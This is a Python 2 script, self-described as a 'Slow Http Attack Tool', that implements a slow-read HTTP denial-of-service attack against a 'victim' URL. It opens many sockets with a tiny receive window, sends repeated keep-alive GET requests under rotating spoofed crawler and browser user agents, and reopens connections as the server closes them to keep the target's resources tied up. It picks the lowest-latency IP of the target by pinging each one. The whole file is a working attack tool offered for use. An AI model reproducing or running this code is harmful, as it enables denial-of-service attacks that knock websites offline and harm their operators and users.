#-*- coding: utf-8 -*-
from optparse import OptionParser
from ThreadFrame import ThreadPool
from ThreadFrame import WorkRequest
import socket
import socks
import subprocess
import sys
import re
import random
import select
import threading
import time

useragents = [
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
 "Opera/9.20 (Windows NT 6.0; U; en)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", # maybe not
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13"
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
]
class SlowRead(ThreadPool):
    def __init__(self, url, conns, repeat, wnd_range, port=80, threads_num = 10):
        ThreadPool.__init__(self, threads_num)
        self.url = url
        self.repeat = repeat
        self.wnd = wnd_range
        self.conns = conns
        self.port = port
        self.socks = []

    def Attack(self):
        self.CreatSocks()
        self.StartAttack()

    def CreatSocks(self):
        for i in range(self.conns):
            self.socks.append(self.SingleSocket())

    def SingleSocket(self):
        try:
            sock = socks.socksocket()
            #sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, random.random(int(self.wnd.split('-')[0]), int(self.wnd.split('-')[1])))
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 10)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, True)
        except:
            print 'Create or set socket error'
            exit()
        return sock

    def SingleTask(self, sock):
        Request = SlowReadRequest(self.url, sock, self.port, self.repeat)
        task = WorkRequest(Request.SingleRequest, callback=self.RequestDebug)
        self.putRequest(task)

    def StartAttack(self):
        for i in range(len(self.socks)):
            self.SingleTask(self.socks[i])
        while True:
            wlists = []
            elists = []
            rs,ws,es = select.select(self.socks, wlists, elists, 0)
            #print 'select return len %d' % len(rs)
            time.sleep(3)
            for s in rs:
                try:
                    data = s.recv(1024)
                except:
                    print 'Port %d recv error' % s.getsockname()[1]
                    continue
                #data transfer complete and create new connenct
                print s
                if not len(data):
                    print 'socket close'
                    s.close()
                    self.socks.remove(s)
                    new_sock = self.SingleSocket()
                    self.SingleTask(new_sock)
                    self.socks.append(new_sock)
                else:
                    print 'data :' + data + ' len : ' + str(len(data))


    def RequestDebug(self, request, result):
        if result:
            print 'Port %d connected and send request sueccess' % request.sock.getsockname()[1]
        else:
            print 'Port %d Failed' % request.sock.getsockname()[1]


class SlowReadRequest():
    def __init__(self, url, sock, port, repeat):
        self.repeat = repeat
        self.sock = sock
        self.port = port
        self.url = url

    def SingleRequest(self):
        self.SingleConnect()
        self.SendRequest()

    def SingleConnect(self):
        try:
            self.sock.connect((self.url, self.port))
        except socket.error, arg:
            (errno, err_msg) = arg
            print "Connect server failed: %s, errno=%d" % (err_msg, errno)

    def SendRequest(self):
        for r in range(self.repeat):
            self.sock.send("GET / HTTP/1.1\r\n"
                            "Host: %s\r\n"
                            "Connection: keep-alive\r\n"
                            "User-Agent: %s\r\n"
                            #"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                            "Accept-Encoding: gzip, deflate, sdch\r\n"
                            "Accept-Language: zh-CN,zh;q=0.8\r\n"
                            "\r\n" %
                            (self.url, random.choice(useragents)))
            time.sleep(0.5)

class victim_url():
    def __init__(self, url):
        self.url = url

    def __test_network_connectivity(self, host):
        ret = subprocess.Popen(['ping.exe ', host], stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
        out = ret.stdout.read()
        p1 = re.compile('平均'.encode('gbk') + ' = [\d]+')
        p2 = re.compile('[\d]+% ' + '丢失'.encode('gbk'))
        loss = p2.findall(out)
        if loss[0].split(' ')[0] == '100%':
            return ''
        aver = p1.findall(out)
        #print 'host:' + host  +  ' aver : ' + aver[0].split(' ')[-1] + ' loss : ' + loss[0].split(' ')[0]
        return aver[0].split(' ')[-1]

    def choose_best_host(self, hosts):
        lag_dict = {}
        for ip in hosts:
            lag = self.__test_network_connectivity(ip)
            if lag:
                lag_dict[ip] = int(lag)
        if len(lag_dict) == 0:
            return ''
        for item in lag_dict:
            if lag_dict[item] == min(lag_dict.values()):
                print '[Info]:Choose IP ' + item
                return item

    def url_check(self):
        print '[Info]:Check url:' + self.url
        host_list = []
        try:
            hosts = socket.getaddrinfo(self.url, None)
        except:
            print '[Error]: Cannot resolve the url: '  + self.url
        for item in hosts:
            host_list.append(item[4][0])
            #print item[4][0]
        print 'DNS translate:',
        print host_list
        return host_list

def cmd_read():
    opt = OptionParser(usage = 'Slow Http Attack Tool v1.0')
    opt.add_option('-u', '--url', dest = 'url', type = 'string', help = 'Victim url')
    opt.add_option('-n', '--NumberLink', dest = 'numlink', type = 'int', help = 'Number of connections')
    opt.add_option('-p', '--port', dest = 'port', type = 'int', help = 'Victim port')
    opt.add_option('-r', '--repeat', dest = 'repeat', type = 'int', help = 'Repeat times')
    opt.add_option('-w', '--window', dest = 'wnd_range', type = 'string', help = 'Range of window size')
    opt.add_option('-t', '--thread', dest = 'thread', type = 'int', help = 'Number of attack threads')
    option, arg = opt.parse_args()
    return option

if __name__ == '__main__':
    reload(sys)
    sys.setdefaultencoding('utf8')

    args = cmd_read()
    v = victim_url(args.url)
    v.url_check()
    a = SlowRead(args.url, args.numlink, args.repeat, args.wnd_range, args.port, args.thread)
    t = threading.Thread(target = a.poll)
    t.start()
    a.Attack()
